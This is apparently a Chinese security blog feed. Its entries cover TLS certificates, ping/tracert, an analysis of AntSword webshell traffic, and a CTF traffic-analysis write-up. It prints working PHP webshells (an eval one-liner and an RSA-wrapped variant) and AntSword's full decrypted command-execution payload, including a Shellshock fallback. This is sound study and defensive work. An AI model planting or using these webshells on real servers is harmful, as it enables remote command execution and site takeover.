        <content type="html"><![CDATA[<p>最近复习计算机网络看到了计算机网络安全那一章，对SSL TLS 证书等内容有了初步理解，这里做一个记录。<br>参考链接：<br><a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html">http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html</a><br><a href="https://segmentfault.com/a/1190000002554673">https://segmentfault.com/a/1190000002554673</a><br><a href="https://kb.cnblogs.com/page/197396/">https://kb.cnblogs.com/page/197396/</a><br><a href="https://www.cnblogs.com/handsomeBoys/p/6556336.html">https://www.cnblogs.com/handsomeBoys/p/6556336.html</a></p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>CA是证书授权中心，简单说就是签发证书的机构。<br>证书签发流程：服务端向CA提交公钥，组织信息，域名等内容<br>CA审核通过后签发证书，证书包括了：申请者公钥，申请者信息、域名、有效时间、序列号等内容，还有一个数字签名：CA用CA自己的私钥对申请者所有信息生成的摘要进行加密。<br>简单来说，证书=申请者公钥+CA签名+申请者信息</p><h2 id="https请求过程"><a href="#https请求过程" class="headerlink" title="https请求过程"></a>https请求过程</h2><p>1.客户端向服务器443端口发送请求<br>2.服务器返回证书<br>3.客户端验证证书有效性，并且产生一随机值，通过服务器公钥加密。<br>4.服务器收到加密后的随机值后，用私钥解密，接下来双方传输的内容都用该随机值加密。</p><h2 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h2><p>通信过程：<br>1.客户端给服务器发送请求，声明自己的加密方式，并且发送一个随机数<br>2.服务器返回证书，确定使用的加密方式，发送一个随机数<br>3.客户端验证证书有效性，验证通过后，产生一个随机数，通过服务器公钥进行加密，作为premaster key发送给服务器。<br>4.服务器接受到加密后的随机数后解密<br>5.客户端与服务器根据相同的算法，通过两个未加密的随机数与第三个随机数产生session key<br>6.服务器使用session key发送一个数据，验证连接是否成功建立。<br>7.以后客户端和服务器的通讯使用session key加密（对称加密）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ping&amp;tracert</title>
      <link href="2020/05/01/ICMP-tracert/"/>
      <url>2020/05/01/ICMP-tracert/</url>
      
        <content type="html"><![CDATA[<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>ping命令用的是ICMP回送请求与回答，如果ping一个存在的主机的话，在不禁止ping的前提下会发一个ICMP回送回答，主机计算RTT，平均RTT与TTL。</p><h1 id="tracert-traceroute"><a href="#tracert-traceroute" class="headerlink" title="tracert/traceroute"></a>tracert/traceroute</h1><p>利用的是ping命令，把ttl从1往上加，当路由器收到ttl为1的数据包后-1变成0，会给源站发一个超时，但是存在的问题是如果该路由器对超时不处理的话，在源站看到的节点就变成了*，也有可能是某些路由器对tracert命令不可见。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑流量分析&amp;webshell</title>
      <link href="2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"/>
      <url>2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="webshell理解"><a href="#webshell理解" class="headerlink" title="webshell理解"></a>webshell理解</h1><p>webshell的本质是传入命令并且执行。<br>常见的php webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="meta">?&gt;</span>) </span><br></pre></td></tr></table></figure><blockquote><p>shell.php<br>访问shell.php的时候post一个参数cmd,<br>如果传入的是cmd=system(“whoami”)的话就会执行whoami。<br>webshell相当于网站管理功能，提供列目录，修改文件，虚拟终端等操作，这些可视化操作的背后其实是一条条PHP语句写的，然后送到服务器执行，然后根据返回结果可视化到管理终端。<br>shell与waf一直在升级，衍生出了各种混淆方法。当然，waf也在抓特征流量进行拦截。</p></blockquote><h1 id="蚁剑流量分析"><a href="#蚁剑流量分析" class="headerlink" title="蚁剑流量分析"></a>蚁剑流量分析</h1><p>今天分析的是昨天没看完的蚁剑流量。发送数据采用RSA加密，服务器返回数据采用AES加密。<br>shell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCd3U6xkZFNwFKSRlRa+Jsdy0/E</span><br><span class="line">rkpoq9A/Xl58TfOL5ghxaQh91zWriwpsMVMdjkORzTNM0yrKoyF2+LjxzE2wW6Qt</span><br><span class="line">/NC6dQgUKQQJk9ypgq4Po9ypxxI8AdtthKSelijpqD5YsXZYSFGCyLNaC33+pVp2</span><br><span class="line">wQUED9OTJg9AuXIG4QIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>首先模拟一次过程：启动虚拟终端并输入whoami查询。</p><h2 id="在wireshark抓到数据包："><a href="#在wireshark抓到数据包：" class="headerlink" title="在wireshark抓到数据包："></a>在wireshark抓到数据包：</h2><img src="http://cdn.polowong.top/static/images/as1.jpg"><h2 id="追踪HTTP流量："><a href="#追踪HTTP流量：" class="headerlink" title="追踪HTTP流量："></a>追踪HTTP流量：</h2><img src="http://cdn.polowong.top/static/images/as2.jpg"><h2 id="对发送的数据进行还原"><a href="#对发送的数据进行还原" class="headerlink" title="对发送的数据进行还原"></a>对发送的数据进行还原</h2><p>使用私钥加密的数据用公钥解密。<br>解密后数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ant=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;@session_start();<span class="variable">$key</span>=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));&#125;;</span><br><span class="line"><span class="comment">//采用AES加密输出，key为session前16位。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;3c5e3e9640&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;cda10a9ad&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//输出内容</span></span><br><span class="line">ob_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;kba6818a1ddd35&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;med28329bbe5b9&quot;</span>]);<span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;v610da0caba97e&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="comment">//获取下面post的参数，分别是cmd和whoami。</span></span><br><span class="line"><span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;</span><br><span class="line"><span class="comment">//判断是Linux还是Windows</span></span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//拼接命令</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;</span><br><span class="line"><span class="comment">//命令执行函数</span></span><br><span class="line"><span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="comment">//命令执行并且stderr重定向到stdout</span></span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="comment">//执行入口</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里是post的数据，对应上面的med28329bbe5b9和kba6818a1ddd35。。。&amp;kba6818a1ddd35=Y21k&amp;med28329bbe5b9=Y2QgL2QgIkU6XFxwaHBzdHVkeV9wcm9cXFdXV1xcdGVzdC5pbyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;v610da0caba97e=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体的操作写在上方注释里了，比较清楚。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>接下来启动虚拟终端，传入whoami ，并且执行，查看数据包。</p><img src="http://cdn.polowong.top/static/images/as4.jpg"><h2 id="返回数据解密"><a href="#返回数据解密" class="headerlink" title="返回数据解密"></a>返回数据解密</h2><p>客户端收到数据后会用约定的key进行解密。<br>返回数据：<img src="http://cdn.polowong.top/static/images/as3.jpg"><br>注意：返回的数据里面并不全是有效加密内容，前后存在两端干扰数据，可以在 代码中看到分别是3c5e3e9640和cda10a9ad。中间的数据才是真正有用的数据。<br>首先对中间的数据base64解密一次，然后使用AES-128-ECB解密。key为session前16位：substr(sessionid,0,16);。解密方法：openssl_decrypt($payload, ‘AES-128-ECB’, $key,OPENSSL_RAW_DATA)解密后数据：ZGVza3RvcC00dTgxYjg1XDY5MDI3DQpbU10NCkU6XHBocHN0dWR5X3Byb1xXV1dcdGVzdC5pbw0KW0VdIA0K<br>然后进行base64解密。解密后的数据：desktop-4u81b85\69027<br>[S]<br>E:\phpstudy_pro\WWW\test.io<br>[E]<br>就是执行whoami的结果。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>蚁剑流量分析算是看了一天，得益于前期对AES和RSA的基础知识，以至于不需要先看RSA和aes。。2333<br>在对shell和发送的代码进行分析的时候还是遇到了一点困难，有些地方只是大体明白了什么意思，比如识别是Linux还是Windows，但是细讲每一个函数的功能我还是不知道的。对此我的思路是既然目标是命令执行，那么就把底层的实现稍微抽象一点，不影响后续分析。<br>分析流量还是一件非常有意思的事情，虽然我没有机会打AWD，but I love AWD forever!!!!!!!</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒月赛流量分析</title>
      <link href="2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路"><a href="#经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路" class="headerlink" title="经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路"></a>经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/6701">https://xz.aliyun.com/t/6701</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd">https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd</a><br>用到的知识：PHP OPENSSL，wireshark抓本地包（npcap），AES，wireshark流量分析、过滤语法、蚁剑RSA</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="导出HTTP对象"><a href="#导出HTTP对象" class="headerlink" title="导出HTTP对象"></a>导出HTTP对象</h3><p>首先常规操作就是导出http对象，发现有个upload.php，发现传了个不认识的马，写了公钥，考虑RSA加密。</p><img src="http://cdn.polowong.top/static/images/awd1.jpg"><p>可以确定，传了个马，思路的重点应该向与马的交互上考虑。</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>通过过滤数据包，确定了上传后的文件命名为1581335771.php，于是在数据包中重点观察与该文件的交互。<br>使用过滤器，语法：http and ip.dst==139.224.112.182 and http.request.method==POST</p><img src="http://cdn.polowong.top/static/images/awd2.jpg"><p>按个追踪HTTP数据流看看呗，看看有啥有用的信息没。<br>追踪29543包的时候，发现了字符串L3Zhci93d3cvaHRtbC9hZG1pbi91cGxvYWQv，可能是base64，解一下发现是/var/www/html/admin/upload/，应该是文件的上传路径。<br>剩下的HTTP流挨个追踪，返回的数据都是加密后的，返回数据暂时没有什么有用的。于是继续注意发送的数据。<br>在追踪倒数第二个HTTP流的时候，发现了一些蛛丝马迹。发送的数据那有Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtjYXQgZmxhZztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=，经解密后发现是cd “/var/www/html/admin/upload”;cat flag;echo [S];pwd;echo [E]，这里可能藏了flag。所以应该对该数据包发送的数据进行还原。</p><h3 id="流量还原"><a href="#流量还原" class="headerlink" title="流量还原"></a>流量还原</h3><p>由于导出HTP对象的时候有个公钥，考虑非对称加密（RSA），结合题目给的关键字ant与给出的shell的格式，可以确定这是用蚁剑连的shell，并且发送数据经过了RSA加密。<br>可以写个脚本把发送的数据还原出来。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ant</span>=<span class="string">&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37m